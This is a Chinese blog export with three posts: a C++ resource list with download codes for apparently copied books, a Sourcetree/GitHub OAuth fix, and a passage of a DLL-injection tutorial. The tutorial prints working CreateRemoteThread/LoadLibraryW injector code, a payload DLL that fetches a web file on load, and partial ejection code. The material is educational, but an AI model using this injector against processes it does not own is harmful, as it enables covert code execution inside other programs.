程序设计爱好者，或者是渴望突破编程瓶颈、大幅提升自我修为的程序设计爱好者，本书都必将使你获益良多。 《从缺陷中学习C&#x2F;C++》从本质上来说，这就是一个 C&#x2F;C++ 的错题集。全书中包括 63 个问题引发的错误，即书名中的缺陷。也是避坑指南。 《C++ Templates中文版》，深入了解现代 c++ 模板的实用书籍。本书不仅是对 C++ 模板的权威解释，而且本书还深入地介绍了其他一般的 C++ 思想。 《STL源码剖析》详细地了解 STL 的底层实现机制，同时也可以对常用数据结构，C++ 内存管理拥有更深的理解。 还有《C++标准库(第2版)》、《C++并发编程实战》、《C++编程思想（两卷合订本）》等，介绍的这些书我都买了，不过说实话，后面的几本都是泛泛的看了下，当作工具书。 其他文档: 华为最牛逼的c++ 基础与提高PDF LeetCode101题解 Google 开源项目风格指南——中文版 C++ 相关电子书和资料: 需要下载下面电子书的话，直接点击书名，输入提取码！ 第二套、侯捷老师全系列八部曲 - 手把手教你进阶系列 提取码：rb16 00 - 侯捷系列-全部课件 提取码：poo3 01、C++面向对象高级编程（上） 提取码：51rd 01、C++面向对象高级编程（下） 提取码：0869 00 - 侯捷系列-全部课件 提取码：poo3 03 - 侯捷-C++设计模式 提取码：zn8n 04 - 侯捷-C++新标准C++11&amp;14 提取码：5jl1 05 - 侯捷-C++内存管理机制_60_侯捷 提取码：b8b3 06 - 侯捷-C++ Startup 揭密：C++ 程序的生前和死后 提取码：adro 07、算法原理与实践（选修） 提取码：7548 08、系统设计与实践（选修） 提取码：697b 第三套、Linux CC++网络编程实践-陈硕 提取码：wv79 陈硕 - C++实践工程学 提取码：blou 易学C++ 提取码：yiwo 提高C++性能的编程技术.左飞 提取码：anft 深入理解C++11 提取码：py26 深度探索C++对象模型 提取码：0v2p 侯捷STL课件 提取码：fuuh 跟我一起写makefile 提取码：k090 大话设计模式C++ 提取码：r1wi 陈硕 - C++实践工程学 提取码：dgy4 STL源码剖析+源码 提取码：nkcl Modern C++ Design 提取码：t1kk Effective-C++-第二版 提取码：vy1b Effective STL中文版 提取码：t3gy Effective C++ 第三版 高清PDF 提取码：bd36 C++设计新思维-泛型编程与设计之应用 提取码：7gew C++工程实践经验课 提取码：o5v4 C++对象模型 提取码：azv9 C++大学教程 提取码：012g C++程序设计语言 提取码：abu1 C++沉思录中文第2版 提取码：o88v C++并发编程实战 提取码：fuj8 C++标准程序库 提取码：318m C++编程调试秘笈 提取码：8ool C++编程思想（两卷合订本） 提取码：ekkz C++编程规范-101条规则准则与最佳实践 提取码：0o6k C++Primer 5th 英文版 提取码：cxmu C++ Primer习题集 提取码：lvmx C++ Primer-第4版 提取码：8gyu C++ Primer（第5版）_带书签_高清完整版 提取码：x6rl C++ Primer Plus 提取码：i0p7 C++ 干货文章 一文让你学完C++，干货收藏！！！ 2022最稳C&#x2F;C++学习路线 呐，这不就是你要的C++后台开发学习路线吗？ 这才是你需要的C语言、C++学习路线！ 校招｜ C++ 后台开发学习路线 STL总结与常见面试题+资料 一定用得到的免费C++资源集合，值得收藏 两万字总结《C++ Primer》要点 深度探索C++对象模型笔记 Effective C++学习笔记 C&#x2F;C++框架和第三方库汇总 万字长文系统梳理C++函数指针 学过 C++ 的你，不得不知的这 10 条细节！ 值得收藏的几个 C&#x2F;C++ 学习网站 假如C++是一只箭，你会用它来射哪只雕？| 就业岗位分享 如何优雅地利用C++编程从1乘到20？ C&#x2F;C++ 中的 #pragma once 作用是什么？ C++ Best Practices (C++最佳实践)翻译与阅读笔记 防御性编程技巧 五万字读懂c++ 看完这 7 条，模拟 C++ 新功能只是一个小目标！ 硬核 | C++ 基础大全 C++模板总结 C++ 读取 UTF-8 及 GBK 系列的文本方法及原理 C++ 日期和时间编程 C++ 编程习惯与编程要点 C++ 内存模型 编程5分钟，命名2小时！聊聊命名规则！ C++ 与正则表达式 手写线程池 - C++版 C++ 线程的使用 C++ 八股文（一） C++ 使用 chrono 库处理日期和时间 硬核 | 50 家企业 C++ 面经分享 C++编译期多态与运行期多态 C++ 并发编程（C++11 到 C++17 ） C++内存管理（建议收藏） 两万字长文，见过最好的模板元编程文章！ C++虚函数表原理浅析 C++函数调用过程深入分析 动图演示：如何彻底理解红黑树？ C++性能优化 万字长文|深入 C++ 内存管理 一个程序员的C++学习之路 C++异常机制概述 这些课堂上不教的 C++ 的基本特性你都知道吗？ C++ 如何避免内存泄露？ C++11 中的左值、右值和将亡值 C&#x2F;C++函数指针与指针函数 delete 和 delete [] 的真正区别 C++ 学习笔记 一起探索C++类内存分布 【最佳实践】C++陷阱与套路 泛型Lambda，如此强大！ 架构思维：如何让写程序像搭积木一样轻松？ 打工人万字讲清软件性能优化 C++按值返回对象那些事 哪个程序经得起这样的优化？ C++ 的门门道道 线程安全代码到底是怎么编写的？ 内存管理：程序是如何被优雅的装载到内存中 简单！代码原来是这样被CPU跑起来的 600 条最强 Linux 命令总结 C++对象的底层原理都在这儿了，还敢说学不会？ C++是如何从代码到游戏的？ if-else和switch-case哪个效率更高？看这四张图。 谈谈 C++ 单例模式 亲身体验！后端工程师学习路径、书籍、视频推荐 C++常见的三种内存破坏的场景和分析 你踩过几种C++内存泄露的坑？ 内存池设计与实现 打开线程 | 进程 | 协程的大门 深度好文|面试官：进程和线程，我只问这19个问题 效能优化实践 | C&#x2F;C++单元测试万能插桩工具 手写线程池 - C++版 C++ 线程的使用 C++学到什么程度可以面试工作？ C++ 内存管理（一） std 源码剖析及 C++ 内存管理(二) C++代码简化之道 揭开高性能服务器底层面纱 windows程序崩溃调试终极武器 长文预警！C语言与C++常见问答题 提升 C++ 开发效率的几个小技巧 书单：拓展对C++的认知层次 和各种诡异 Bug 打交道 13 年，我总结了 18 个经验 去银行写代码是什么样的体验 谈谈C++新标准带来的属性（Attribute） 百度C++工程师的那些极限优化（并发篇） 百度C++工程师的那些极限优化（内存篇） 图解|从武侠角度探究STL排序算法的奥秘 C++中是如何调用C接口的？ C++编码优化之减少冗余拷贝或赋值 计算机为什么要用补码？ 生成随机数的方式你选对了吗？ 总结了24个C++的大坑，看你能躲过几个？ 这些知识点你都知道吗，测试你的C++入门程度 超硬核 | 2 万字+20 图带你手撕 STL 序列式容器源码 浅析C++智能指针和enable_shared_from_this 机制 经典永不过时！重温设计模式 全网首发！！C++20新特性全在这一张图里了 C++的最后一道坎|百万年薪的程序员 C++模版的本质 10 个内存引发的大坑，你能躲开几个？ C++内存管理全景指南 9个提高代码运行效率的小技巧你知道几个？ 精选 30 个 C++ 面试题（含解析） 腾讯 C++ 笔试&#x2F;面试题及答案 C++ 万字长文第一篇—拿下字节面试 《逆袭进大厂》之C++篇49问49答(绝对的干货) 《逆袭进大厂》第二弹之C++进阶篇59问59答(超硬核干货) 《逆袭进大厂》之C++提高篇79问79答 自己动手实现一个malloc内存分配器 | 30图 现代C++之手写智能指针 10张图22段代码，万字长文带你搞懂虚拟内存模型和malloc内部原理 面试系列之C++的对象布局【建议收藏】 c++代码整洁之道 源码分析C++的string的实现 23种设计模式的通俗解释，看完秒懂 一位大佬对于 Qt 学习的最全总结（三万字干货） 3万字Linux总结 加密与解密 TCP数据粘包的处理 C++视频推荐： C++视频学习教程基础篇 华郑莉老师视频 侯捷C++视频全集与陈硕网络编程 最好的Qt全套视频教程 C++ 开源推荐： FreeNOS:深入理解C++，以及操作系统原理。FreeNOS（Free Niek的操作系统）是一个基于C++的基于微内核的学习操作系统。这是一个用C++实现的微内核的操作系统，各种宏内核中的服务作为一个独立的services在微内核中，基于消息的通信方式，这点其实跟mac内核中的mach那部分机制相似。 Boost:Boost 库是一个经过千锤百炼、可移植、提供源代码的C++ 库，作为标准库的后备，是C++ 标准化进程的发动机之一。 Boost 库由C++标准委员会库工作组成员发起，在C++ 社区中影响甚大，其成员已近2000 人。 Boost 库为我们带来了最新、最酷、最实用的技术，是不折不扣的“ 准” 标准库。 muduo:一个基于 Reactor 模式的现代 C++ 网络库，它采用非阻塞 IO 模型，基于事件驱动和回调，支持多核多线程，适合编写 Linux 服务端多线程网络应用程序。 libevent:一个是轻量级的网络库. log4cpp:日志库， 支持多线程， 日志重定向到网络等都有， 反正你能想到的日志的功能， 都有。 OpenSSL:OpenSSL 包含一个命令行工具用来完成OpenSSL 库中的所有功能，更好的是，它可能已经安装到你的系统中了。 wfrest:简单高效的c++11异步restful网络框架。 workflow:当前最火最简洁好用的c++异步网络库workflow。 modern-cpp-tutorial:modern-cpp-tutorial 是现代 C++ 教程，它的目的是提供关于现代 C++（2020 年前）的相关特性的全面介绍。 MyTinySTL:用 C++11 重新复写了一个小型 STL（容器库＋算法库）。代码结构清晰规范、包含中文文档与注释，并且自带一个简单的测试框架，适合 C++ 新手来实践一番。 Tinytetris:Tinytetris 是一个用 C++ 编写的终端版俄罗斯方块游戏。它提供了两个版本的源码，分为注释版和库版，注释较多易于理解和学习。 calculator: 操作系统计算机网络数据库马不停蹄的更新中。。。。。","categories":[],"tags":[]},{"title":"解决Sourcetree推github不停弹登录窗Logon failed, use ctrl+c to cancel basi","slug":"解决Sourcetree推github不停弹登录窗Logon-failed-use-ctrl-c-to-cancel-basi","date":"2023-11-26T23:49:11.000Z","updated":"2023-12-24T17:38:28.415Z","comments":true,"path":"2023/11/27/解决Sourcetree推github不停弹登录窗Logon-failed-use-ctrl-c-to-cancel-basi/","link":"","permalink":"http://example.com/2023/11/27/%E8%A7%A3%E5%86%B3Sourcetree%E6%8E%A8github%E4%B8%8D%E5%81%9C%E5%BC%B9%E7%99%BB%E5%BD%95%E7%AA%97Logon-failed-use-ctrl-c-to-cancel-basi/","excerpt":"最近有一段时间没用 GitHub，新建了一个仓库，打开 Sourcetree → + → Clone → 填入git地址，顺利拉取了仓库分支。分支一个 → 提交 → 推送，忽然弹出了GitHub登录窗口，记得以前曾经弹过一次，忘记什么情况了，那就填写用户名、密码，login吧： 红色闪眼啊，报错啊！~git -c diff.mnemonicprefix&#x3D;false -c core.quotepath&#x3D;false –no-optional-locks push -v –tags origin main:mainLogon failed, use ctrl+c to cancel basic credential prompt.","text":"最近有一段时间没用 GitHub，新建了一个仓库，打开 Sourcetree → + → Clone → 填入git地址，顺利拉取了仓库分支。分支一个 → 提交 → 推送，忽然弹出了GitHub登录窗口，记得以前曾经弹过一次，忘记什么情况了，那就填写用户名、密码，login吧： 红色闪眼啊，报错啊！~git -c diff.mnemonicprefix&#x3D;false -c core.quotepath&#x3D;false –no-optional-locks push -v –tags origin main:mainLogon failed, use ctrl+c to cancel basic credential prompt. “Logon failed…” 大概是手快，密码输错了吧，再来一遍，什么？还是失败，估计是密码自己也记错了。赶紧上官网登录试一下，实在不行重置。。。咦？还是刚才的用户名、密码，官网顺利登录，没问题啊。回来 Sourcetree 再试一遍，错误照常。看来八成 Sourcetree 出毛病了。baidu 吧，哦，有人说到什么 Git 软件更新了，什么登录机制变了，不能再用登录框的方式登录了，更新后就不会出现登陆框了，会自动连接到 GitHub 官网验证。。。云云。嗯，和我的情况符合，赶紧点击文章中给的官方 Git 链接，下载了最新版本的 Git，安装。保险起见重启电脑，打开 Sourcetree，提交，哇，居然还是有弹窗啊，稳定情绪，说不定这次登录就可以了，输入用户名、密码 → login，报错依旧。看来这方法不行。继续baidu，又试了在仓库设置中修改 git 地址为 &#117;&#x73;&#x65;&#114;&#78;&#x61;&#x6d;&#101;&#x40;&#103;&#105;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#109;&#x2F;xxx&#x2F;xx.git 的格式，还是不行。是最后这个提示帮助了我，有网友说需要“使用OAuth进行身份验证”，翻了翻 Sourcetree 菜单，最后终于在 工具 → 选项 中找到答案。选项 → 验证 选项卡。看到现在的 gitHub 登录验证为 Basic ， 直接编辑用户，输入密码，好像无反应。新建一个吧，右上角“添加”，服务商: GitHub, 验证一定选择 OAuth，这时，下面的用户名会是禁用状态： 直接点击下面的按钮“刷新 OAuth 令牌”，奇迹出现了，自动跳转到浏览器打开了 GitHub 登录界面： 赶紧登录吧，登录后： 看到授权成功！再次返回 Sourcetree 界面，看到登录窗上已经显示绿色√ ，认证成功！ 确定，这时可以看到验证窗口中多了一个账户，下面 “Git 已存密码”中也添加了一个Git用户，但是两个的验证方式是不同的，这点不太明白具体意思，有时间查一下。好了，接下来，赶紧推啊。祝你也 顺 利 推 送！ 方案二也可以在GitHub个人用户里生成一个新的note和tokens，第一次输入自己的GitHub账号和密码，然后在第二次输入usernuserame和password的时候输入对应的note和tokens就好了。具体操作步骤可以参考博客https://blog.csdn.net/weixin_46622106/article/details/111914231","categories":[],"tags":[]},{"title":"深入理解dll注入","slug":"深入理解dll注入","date":"2022-11-30T20:17:37.000Z","updated":"2023-12-24T17:38:44.738Z","comments":true,"path":"2022/12/01/深入理解dll注入/","link":"","permalink":"http://example.com/2022/12/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3dll%E6%B3%A8%E5%85%A5/","excerpt":"DLL注入是指向运行中的其它进程强制插入特定的DLL文件。从技术细节来说，DLL注入命令其它进程自行调用LoadLibrary()API，加载用户指定的DLL文件。DLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。","text":"DLL注入是指向运行中的其它进程强制插入特定的DLL文件。从技术细节来说，DLL注入命令其它进程自行调用LoadLibrary()API，加载用户指定的DLL文件。DLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。 可以看到，test.dll已被强制插入进程(本来notepad并不会加载test.dll)。加载到某一进程中的test.dll与已经加载到某一进程中的dll一样，拥有访问notepad.exe进程内存的权限。 DLL被加载到进程后会自动运行DLLMain()函数，用户可以把想执行的代码放到DLLMain()函数，每当加载DLL时，添加的代码就会得到执行。利用这种特性可以修复程序Bug以及添加新功能DllMain 函数是DLL模块的默认 入口点。当Windows加载DLL模块时调用这一函数。系统首先调用全局对象的 构造函数，然后调用 全局函数DLLMain。DLLMain 函数不仅在将DLL链接加载到进程时被调用，在DLL模块与进程分离时（以及其它时候）也被调用。 BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: &#x2F;&#x2F;添加想要执行的代码 &#x2F;&#x2F;当dll被进程加载时DLLMain被调用 &#x2F;&#x2F;printf(“ process attach of dll”); break; case DLL_THREAD_ATTACH: &#x2F;&#x2F;添加想要执行的代码 &#x2F;&#x2F;当有线程被创建时，DLLMain被调用 printf(“ thread attach of dll”); break; case DLL_THREAD_DETACH: &#x2F;&#x2F;添加想要执行的代码 &#x2F;&#x2F;当有线程结束时，DLLMain被调用 printf(“ thread detach of dll”); break; case DLL_PROCESS_DETACH: &#x2F;&#x2F;添加想要执行的代码 &#x2F;&#x2F;当dll被进程卸载时，DLLMain被调用 printf(“ process detach of dll”); break; } return TRUE;} 一、DLL注入示例 使用LoadLibrary()API加载某个DLL时，该DLL中的DLLMain()函数会被调用执行。DLL注入的工作原理就是从外部促使目标进程调用LoadLibrary()API,所以会强制调用执行DLL的DLLMain函数。并且被注入的DLL拥有目标进程内存的访问权限，用户可以随意操作。 二、实现DLL注入的方法 1、创建远程线程(CreatRemoteThread) 2、使用注册表(AppInit_DLLs值) 3、消息钩取（SetWindowsHookEx()API） 三、创建远程线程(CreatRemoteThread) 3.1、效果示例 运行process explorer（或者火绒剑，任务管理器）获取notepad.exe进程的pid。 可以看见process explorer.exe的pid为2788。 运行InjectDll.exe将myhack.dll注入到notepad.exe进程当中。可以看到dll文件已经被注入到里面。 要想在process explorer中看见注入的dll文件，需要依次选择view-&gt;Lower Pane view-&gt;DLLS选项。 进行注入时需要注意： 1.LoadLibraryA 和 LoadLibraryW 不同字符表示之前一直没有成功，没有使用L,但是使用了LoadLibraryW，导致加载dll失败，如果不使用L，请用LoadLibraryA 2.注册的时候注意DLL完整路径，除非被注入程序和dll在同一个文件夹InjectDll.exe 3480 D:\\test\\myhack.dll 同时可以看见文件内已经多了一个html文件，此文件是dll中所指定的文件。 3.2、分析示例源码 在DLLMmain()函数中可以看到，这个dll被加载(DLL_PROCESS_ATTACH)时,先输出一个字符串（”&lt;myhack.dll&gt; Injection!!!”），然后再创建线程调用函数（ThreadProc）。在ThreadProc函数中通过调用URLDownloadToFile来下载指定网站的index.html文件。前面提到过，向进程注入dll后会调用dll的DLLMain函数。所以当dll文件注入到exe进程后，会调用URLDownloadToFile下载文件。 &#x2F;&#x2F;myhack.cpp#include “windows.h”#include “tchar.h” #pragma comment(lib, “urlmon.lib”) #define DEF_URL (L”http://www.naver.com/index.html“)#define DEF_FILE_NAME (L”index.html”) HMODULE g_hMod &#x3D; NULL; DWORD WINAPI ThreadProc(LPVOID lParam){ TCHAR szPath[_MAX_PATH] &#x3D; {0,}; if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) ) return FALSE; TCHAR *p = _tcsrchr( szPath, &#39;\\\\&#39; ); if( !p ) return FALSE; //下载指定网站的index.html文件 _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME); URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL); return 0; } BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){ HANDLE hThread &#x3D; NULL; g_hMod = (HMODULE)hinstDLL; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : //加载时 OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;); //输出调试字符串 hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); //创建线程 CloseHandle(hThread); break; &#125; return TRUE; } main函数的主要功能时检查输入程序的参数，然后调用InjectDLL函数。InjectDLL函数是用来进行dll注入的核心，其作用是使目标进程自行调用LoadLibrary这个api。 &#x2F;&#x2F;InjectDLL.cpp#include “windows.h”#include “tchar.h” BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){ TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) ) &#123; _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError()); return FALSE; &#125; if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup &amp;luid) ) // receives LUID of privilege &#123; _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) &#123; _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) &#123; _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;); return FALSE; &#125; return TRUE; } BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath){ HANDLE hProcess &#x3D; NULL, hThread &#x3D; NULL; HMODULE hMod &#x3D; NULL; LPVOID pRemoteBuf &#x3D; NULL; DWORD dwBufSize &#x3D; (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR); LPTHREAD_START_ROUTINE pThreadProc; // #1. 使用 dwPID 获取目标进程(notepad.exe)句柄（PROCESS_ALL_ACCESS权限），然后就可以用 hProcess 控制进程. if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) &#123; _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError()); return FALSE; &#125; // #2. 在目标进程(notepad.exe) 内存中分配 szDllName 大小的内存，返回 pRemoteBuf 作为该缓冲区的地址. pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); // #3. 将 myhack.dll 路径写入刚刚分配的缓冲区. WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); // #4. 获取 LoadLibraryW() API 地址，kernel32.dll在每个进程中的加载地址相同（这个特性就是我们要利用的）. hMod = GetModuleHandle(L&quot;kernel32.dll&quot;); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;); // #5. 在 notepad.exe 中运行线程 hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); //CreateRemoteThread()驱使进程调用LoadLibrary()，进而加载指定的DLL文件 WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE; } int _tmain(int argc, TCHAR *argv[]){ if( argc !&#x3D; 3) { _tprintf(L”USAGE : %s \\n”, argv[0]); return 1; } // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // inject dll if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) ) _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) success!!!\\n&quot;, argv[2]); else _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) failed!!!\\n&quot;, argv[2]); return 0; } 下面来详细分析一下injectDll函数。 调用 OpenProcess这个API，借助程序运行时以参数形势传递过来的dwPID值，获取exe进程的句柄（PROCESS_ALL_ACCESS）。得到PROCESS_ALL_ACCESS之后，就可以用获取的句柄控制对应进程。 &#x2F;&#x2F;获取目标的进程句柄hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID) 需要把即将加载的dll文件的路径通知目标进程。因为任何内存空间都无法进行写入操作，所以先使用VirtualAllocEx() API在目标进程的内存空间中分配一块缓冲区，且指定的缓冲区大小为dll文件路径字符串的长度。 pRemoteBuf &#x3D; VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); 提示：VirtualAllocEx()函数的返回值为分配所得缓冲区的地址。该地址不是程序自身进程(Inject.exe)的内存地址，而是hProcess句柄所指目标进程（notepad.exe）的内存地址。 使用WriteProcessMemory将DLL路径字符串（xxx\\xxx\\xxx.dll）写入到分配所得缓冲区地址。WriteProcessMemory所写的内存空间也是hProcess句柄所指的目标进程的内存空间。 WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); &#x2F;&#x2F;调用API &#x2F;&#x2F;Windows操作系统提供了调试API，借助其可以访问其它进程的内存空间。 &#x2F;&#x2F;例如：VirtualAllocEx()、 WriteProcessMemory等调用LoadLibrary前需要先获取其地址。LoadLibraryW()是LoadLibrary()的Unicode字符串版本。 我们的目标明明是获取加载到 notepad.exe 进程的kernel32.dll的 LoadLibraryW的起始地址，但代码却用来获取加载到 InjectDll.exe进程的kernel32.dll的 LoadLibraryW的起始地址。如果加载到 notepad.exe 进程中的kernel32.dl的地址与加载到 InjectDll.exe 进程中的kernel32.dll的地址相同，那么上面的代码就不会有什么问题。但是如果kernell32.d在每个进程中加载的地址都不同，那么上面的代码就错了，执行时会发生引用错误。 根据 Os 类型、语言、版本不同，kerne32.dll加载的地址也不网。并且 Vista &#x2F;7中应用了新的 ASLR 功能，每次启动时。系统 DLL 加载的地址都会改0。但是在系统运行期间它都会被映射（ Mapping ）到号进程的相同地址。 Windows 作系统中， DLL 首次进入内存称为“加载”( Loading )，以后其他进程需要使用相网 DLL 时不必再次加载，只要将加载过的 DLL 代码与资源映射一下即可，这种映射技术有利于提高肉存的使用效率。 像上面这样， OS 核心 DUL 会被加载到自身固有的地址， DLL 注人利用的就是 Windows Os 这一特性（该特性也可能会被恶意使用，成为 Windows 安全漏洞）。导人InjectDll.exe进程中LoadlibraryW地址与导人notepad.exe进程中的LoadLibraryWO地址是相同的。 &#x2F;&#x2F;在windows中，kernel32.dll在每个进程中的加载地址是相同的。hMod &#x3D; GetModuleHandle(L”kernel32.dll”);pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, “LoadLibraryW”); 在目标进程中运行远程线程，pThreadProc是exe进程内存中LoadlibraryW的地址，pRemoteBuf是exe进程内存中dll字符串的地址。 hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); CreateRemoteThread用来在目标进程中执行其创建的线程，其函数原型如下： 除第一个参数 hProcess 外，其他参数与 CreateThread (）函数完全一样。 hProcess 参数是要执行线程的目标进程（或称“远程进程”、“宿主进程”）的句柄。 IpStartAddress 与 IpParameter 参数分别给出线程函数地址与线程参数地址。需要注意的是，这2个地址都应该在目标进程虚拟内存空间中（这样目标进程才能认识它们）。 HANDLE CreateRemoteThread( &#x2F;&#x2F; 进程句柄 hProcess, &#x2F;&#x2F; 线程安全描述字，指向SECURITY_ATTRIBUTES结构的指针 LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, &#x2F;&#x2F; 线程栈大小，以字节表示 LPTHREAD_START_ROUTINE lpStartAddress, &#x2F;&#x2F; 指向在远程进程中执行的函数地址 LPVOID lpParameter, &#x2F;&#x2F; 传入参数 DWORD dwCreationFlags, &#x2F;&#x2F; 创建线程的其它标志 LPDWORD lpThreadId &#x2F;&#x2F; 线程身份标志，如果为NULL,则不返回); HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); 查看ThreadProc与LoadLibrary。两函数都有一个4字节的参数，并返回一个4字节的值。也就是说，二者形态结构完全一样灵感即源于此。调用 CreateRemoteThread 时，只要将 LoadLibrary函数的地址传递给第四个参数 IpStartAddress ，把要注人的 DLL 的路径字符串地址传递给第五个参数 IpParameter 即可（必须是目标进程的虚拟内存空间中的地址）。由于前面已经做好了一切准备，现在调用该函数使目标进程加载指定的 DLL 文件就行了。 CreateRemoteThread （函数最主要的功能就是驱使目标进程调用LoadLibrary函数，进而加载指定的 DLL 文件。 &#x2F;&#x2F;调用 CreateRemoteThread 创建远程线程所需要的过程函数的标准形式为DWORD WINAPI ThreadProc( In LPVOID lpParameter); &#x2F;&#x2F;Win32编程加载DLL的API为：HMODULE WINAPI LoadLibrary( In LPCTSTR lpFileName); 四、DLL卸载 DLL卸载（DLL Ejection）：将强制插入进程的DLL弹出的技术。 原理：驱使目标进程调用FreeLibrary() API。 提示：FreeLibrary卸载dll的方法只适用于CreateRemoteThread注入 先注入dll到目标进程 注入成功后，卸载dll 分析一下EjectDll.exe #include “windows.h”#include “tlhelp32.h”#include “tchar.h” #define DEF_PROC_NAME (L”notepad.exe”)#define DEF_DLL_NAME (L”myhack.dll”) DWORD FindProcessID(LPCTSTR szProcessName){ DWORD dwPID &#x3D; 0xFFFFFFFF; HANDLE hSnapShot &#x3D; INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; // Get the snapshot of the system pe.dwSize = sizeof( PROCESSENTRY32 ); hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL ); // find process Process32First(hSnapShot, &amp;pe); do &#123; if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) &#123; dwPID = pe.th32ProcessID; break; &#125; &#125; while(Process32Next(hSnapShot, &amp;pe)); CloseHandle(hSnapShot); return dwPID; } BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){ TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) ) &#123; _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError()); return FALSE; &#125; if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup &amp;luid) ) // receives LUID of privilege &#123; _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) &#123; _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) &#123; _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;); return FALSE; &#125; return TRUE; } BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName){ BOOL bMore &#x3D; FALSE, bFound &#x3D; FALSE; HANDLE hSnapshot, hProcess, hThread; HMODULE hModule &#x3D; NULL; MODULEENTRY32 me &#x3D; { sizeof(me) }; LPTHREAD_START_ROUTINE pThreadProc; // dwPID = notepad 进程 ID // 使用 TH32CS_SNAPMODULE 参数，获取加载到 notepad 进程的 DLL名称 hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); bMore = Module32First(hSnapshot, &amp;me); for( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) ) &#123; if( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName) ) &#123; bFound = TRUE; break; &#125; &#125; if( !bFound ) &#123; CloseHandle(hSnapshot); return FALSE; &#125; if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) //使用进程ID来获取目标进程的进程句柄 &#123; _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError()); return FALSE; &#125; 